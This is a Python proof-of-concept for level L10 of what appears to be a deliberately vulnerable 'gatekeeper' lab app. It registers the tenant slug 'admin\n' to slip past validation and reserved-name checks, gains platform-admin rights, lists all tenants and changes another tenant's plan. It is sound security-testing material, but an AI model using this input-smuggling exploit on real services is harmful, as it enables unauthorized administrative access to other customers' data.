"""L10 (gatekeeper) slug trailing-newline normalization-differential PoC.

Three components disagree about what a tenant slug "is":
  - utils/validation.SLUG_RE uses re.match with a '$' anchor, which in Python
    matches just before a single trailing newline (it is not end-of-string;
    that would be \\Z). So "admin\\n" passes slug validation.
  - services/registration checks `slug in RESERVED_SLUGS` on the RAW slug, so
    "admin\\n" is not seen as reserved and registration succeeds.
  - services/authz.is_platform_admin compares text.normalize_slug(slug) =
    slug.strip().lower() against PLATFORM_ADMIN_TENANTS, so "admin\\n" -> "admin"
    and the attacker's tenant is treated as the platform-admin tenant.

Result: an attacker self-registers "admin\\n" and gains platform-admin.
"""
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import load_level, ok

os.environ["GATEKEEPER_DB"] = tempfile.mktemp(suffix=".db")
mod, _, _ = load_level("L10")
mod.bootstrap()
client = mod.app.test_client()


def register(slug):
    return client.post("/tenants", json={"slug": slug, "display_name": "x",
                                         "owner_email": "o@x.co"})


# control: a normal tenant is denied platform admin
tok_normal = register("team-blue").get_json()["token"]
ok(client.get("/admin/tenants", headers={"Authorization": "Bearer " + tok_normal}).status_code == 403,
   "normal tenant is denied platform admin")

# control: the reserved slug 'admin' cannot be registered
ok(register("admin").status_code == 400, "reserved slug 'admin' is blocked")

# exploit: 'admin\n' passes slug validation and the reserved check
reg = register("admin\n")
ok(reg.status_code == 201, "slug 'admin\\n' passed validation and reserved check")
etok = reg.get_json()["token"]

me = client.get("/me", headers={"Authorization": "Bearer " + etok}).get_json()
ok(me["platform_admin"] is True, f"attacker session resolves as platform admin: {me}")

adm = client.get("/admin/tenants", headers={"Authorization": "Bearer " + etok})
ok(adm.status_code == 200, "attacker reached platform-admin endpoint")
ok(len(adm.get_json()["tenants"]) >= 1, "attacker listed all tenants (platform-wide access)")

# and can act as platform admin: change another tenant's plan
chg = client.post("/admin/tenants/team-blue/plan", json={"plan": "business"},
                  headers={"Authorization": "Bearer " + etok})
ok(chg.status_code == 200, "attacker changed another tenant's plan as platform admin")
print("L10 exploit confirmed")
